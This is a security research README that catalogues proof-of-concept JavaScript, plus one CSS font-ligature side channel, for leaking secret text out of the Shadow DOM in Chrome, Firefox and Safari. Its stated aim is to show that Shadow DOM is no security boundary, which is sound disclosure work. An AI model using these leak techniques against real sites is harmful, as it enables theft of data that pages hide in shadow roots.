# Shadow Breakers
This document lists JavaScript APIs to which encapsulation by the Shadow DOM does not apply. It does not include APIs that allow access by explicitly passing a ShadowRoot, such as `getHTML()`. The list includes only cases where at least the text content placed in the Shadow DOM can be leaked.

The purpose of this document is to show that Shadow DOM encapsulation is not perfect, especially that it should not be used as a security boundary. (Shadow DOM is not a security feature.) Please also refer to my slides from Shibuya.XSS techtalk #13: (English:[Shadow DOM & Security - Exploring the boundary between light and shadow](https://speakerdeck.com/masatokinugawa/shadow-dom-and-security-exploring-the-boundary-between-light-and-shadow) / 日本語: [Shadow DOMとセキュリティ - 光と影の境界を探る](https://speakerdeck.com/masatokinugawa/shibuya-dot-xss-techtalk-number-13)).

The following PoCs show that encapsulation is broken by the fact that JavaScript executed outside the Shadow DOM can access the secret text (`deadbeef`) placed inside. You can test the leaks by executing the JavaScript code listed below from the browser's developer console on [this test page](https://masatokinugawa.github.io/shadow_breakers/testpage.html).

If you find an interesting way to leak the text, let me know! :)

## Selection.prototype.anchorNode
```js
window.find('This is a secret:'); // for selecting string placed in Shadow area without user interaction
node = getSelection().anchorNode;
root = node.getRootNode();
if(root instanceof ShadowRoot){
  alert(root.querySelector('#secret').textContent);
}
```
### Impact
DOM node-level access

### Affected browsers
Firefox

### Credits
[Ankur Sundara](https://blog.ankursundara.com/shadow-dom/)

## Selection.prototype.focusNode
```js
window.find('This is a secret:'); // for selecting string placed in Shadow area without user interaction
node = getSelection().focusNode;
root = node.getRootNode();
if(root instanceof ShadowRoot){
  alert(root.querySelector('#secret').textContent);
}
```
### Impact
DOM node-level access

### Affected browsers
Firefox

## Selection.prototype.getRangeAt
```js
window.find('This is a secret:'); // for selecting string placed in Shadow area without user interaction
node = getSelection().getRangeAt(0).commonAncestorContainer;// or startContainer or endContainer
root = node.getRootNode();
if(root instanceof ShadowRoot){
  alert(root.querySelector('#secret').textContent);
}
```
### Impact
DOM node-level access

### Affected browsers
Firefox

## Selection.prototype.toString
```js
// For Chrome / Firefox
window.find('This is a secret:'); // for selecting string placed in Shadow area without user interaction
document.execCommand('selectAll');// Maximize the selection range
alert(getSelection().toString());
```
```js
// For Safari
// Click Shadow area
window.onclick = function(event) {
  if (event.target === shost && window.find("Shadow DOM", false, true) || window.find("contenteditable", false, false)) {
    window.find('This is a secret:', false, true);
    window.find('This is a secret:', false, false);
    document.execCommand('selectAll');
    alert(getSelection().toString());
  }
}
```
### Impact
text access

### Affected browsers
Chrome, Firefox, Safari

### Notes
To reproduce this on Safari, focus must be set to an element inside the Shadow DOM before executing `window.find()`.

### Credits
[Ankur Sundara](https://blog.ankursundara.com/shadow-dom/)

## window.find
```js
// For Chrome / Firefox
result = [];
prefix = 'This is a secret: ';
chars = 'abcdef';
secretLength = 8;
while (result.length !== secretLength) {
  for (i = 0; i < chars.length; i++) {
    char = chars[i];
    if (window.find(`${prefix}${char}`)) {
      result.push(char);
      prefix += char;
      window.getSelection().removeAllRanges();
    }
  }
}
alert(result.join(''));
```
```js
// For Safari
// Click Shadow area
window.onclick = function(event) {
  if (event.target === shost && window.find("Shadow DOM", false, true) || window.find("contenteditable", false, false)) {
    result = [];
    prefix = 'This is a secret: ';
    chars = 'abcdef';
    secretLength = 8;
    while (result.length !== secretLength) {
      for (i = 0; i < chars.length; i++) {
        char = chars[i];
        if (window.find(`${prefix}${char}`, false, false) || window.find(`${prefix}${char}`, false, true)) {
          result.push(char);
          prefix += char;
          window.find("Shadow DOM", false, true);
        }
      }
    }
    alert(result.join(''));
  }
}
```
### Impact
text access

### Affected browsers
Chrome, Firefox, Safari

### Notes
* To reproduce this on Safari, focus must be set to an element inside the Shadow DOM before executing `window.find()`.

### Credits
[Ankur Sundara](https://blog.ankursundara.com/shadow-dom/)

## document.execCommand('insertHTML')
```js
window.find('contenteditable area'); // for selecting string placed in Shadow area without user interaction
document.execCommand('insertHTML',false,'<iframe onload=alert(getRootNode().querySelector("#secret").textContent)>');
```
### Impact
DOM node-level access

### Affected browsers
Chrome, Firefox, Safari

### Notes
* To reproduce this on Safari, focus must be set to an element inside the Shadow DOM before executing `window.find()`.
* Additionally, Safari adds HTML inside the shadow but performs HTML sanitization, so the DOM node-level access is only possible if the bypass succeeds. The above PoC can not bypass the sanitization.

### Credits
[Ankur Sundara](https://blog.ankursundara.com/shadow-dom/)

## Event.prototype.originalTarget
```js
//Put mouse cursor on Shadow area
window.onmousemove = function(event){
  elem = event.originalTarget;
  root = elem.getRootNode();
  if(root instanceof ShadowRoot){
    alert(root.querySelector('#secret').textContent);
  }
}
```
### Impact
DOM node-level access

### Affected browsers
Firefox

## Event.prototype.explicitOriginalTarget
```js
// Put mouse cursor on Shadow area
window.onmousemove = function(event){
  elem = event.explicitOriginalTarget;
  root = elem.getRootNode();
  if(root instanceof ShadowRoot){
    alert(root.querySelector('#secret').textContent);
  }
}
```
### Impact
DOM node-level access

### Affected browsers
Firefox

## UIEvent.prototype.rangeParent
```js
// Put mouse cursor on Shadow area
window.onmousemove = function(event){
  elem = event.rangeParent;
  root = elem.getRootNode();
  if(root instanceof ShadowRoot){
    alert(root.querySelector('#secret').textContent);
  }
}
```
### Impact
DOM node-level access

### Affected browsers
Firefox

## DataTransfer.prototype.mozSourceNode
```js
// Drag something placed in Shadow area
window.ondrag = function(event){
  node = event.dataTransfer.mozSourceNode;
  root = node.getRootNode();
  if(root instanceof ShadowRoot){
    alert(root.querySelector('#secret').textContent);
  }
}
```
### Impact
DOM node-level access

### Affected browsers
Firefox

## DataTransfer.prototype.getData
```js
// for Chrome / Firefox
// Drag selected Shadow area. Leaks also occur in Safari if you manually select and drag the secret text
window.find('This is a secret:');
document.execCommand('selectAll');
window.ondragstart = function(event){
  alert(event.dataTransfer.getData('text'));
}
```
### Impact
text access, attribute value access

### Affected browsers
Chrome, Firefox, Safari

### Notes
* `getData('text/html')` can leak not only text but also attribute values.

## InputEvent.prototype.getTargetRanges
```js
// Type something into the contenteditable area inside Shadow area
window.onbeforeinput = (event) => {
  targetRanges = event.getTargetRanges();
  node = targetRanges[0].endContainer;// or startContainer
  root = node.getRootNode();
  if(root instanceof ShadowRoot){
    alert(root.querySelector('#secret').textContent);
  }  
}
```
### Impact
DOM node-level access

### Affected browsers
Chrome, Firefox, Safari

## CSS inheritance

```js
// PoC demonstrating that SecurityMB's font-based leak technique can be applied to Shadow DOM
// https://research.securitum.com/stealing-data-in-great-style-how-to-use-css-to-attack-web-application/
// Before trying:
// 1. Visit my repository: https://github.com/masatokinugawa/PoCs/tree/main/LavaDome/font-ligatures
// 2. Download them locally
// 3. Execute `npm install` and `node index.js`
// Note: This PoC is tested on Chrome and Firefox
const secretChars = "abcdef";
const prefix = "This is a secret: ";
let index = 0;
let foundChars = "";
const style = document.createElement('style');
document.body.appendChild(style);
style.innerHTML = "#shost {font-family:hack;font-size:300px;}";
const defaultWidth = document.body.scrollWidth;
const loadFont = target => {
  const font = new FontFace("hack", `url(http://localhost:3000/?target=${encodeURIComponent(target)})`);
  font.load().then(() => {
    document.fonts.add(font);
    if (defaultWidth < document.body.scrollWidth) {
      foundChars += secretChars[index];
      console.log(`Found: ${foundChars}`);
      index = 0;
    } else {
      index++;
    }
    if (foundChars.length === 8) {
      alert(foundChars);
    } else {
      loadFont(`${prefix}${foundChars}${secretChars[index]}`);
    }
  });
};
loadFont(`${prefix}${secretChars[index]}`);
```
### Impact
text access

### Affected browsers
Chrome, Firefox, Safari

### Notes
* While this isn't a JavaScript API issue, it's worth mentioning.
* [Inherited properties](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_cascade/Inheritance#inherited_properties) from the Light DOM are applied to the Shadow DOM. This means that CSS-based attacks, such as those [exploiting ligature fonts](https://research.securitum.com/stealing-data-in-great-style-how-to-use-css-to-attack-web-application/), is still possible.
* Unlike other leaks, this behavior (inheritance) is spec'd.
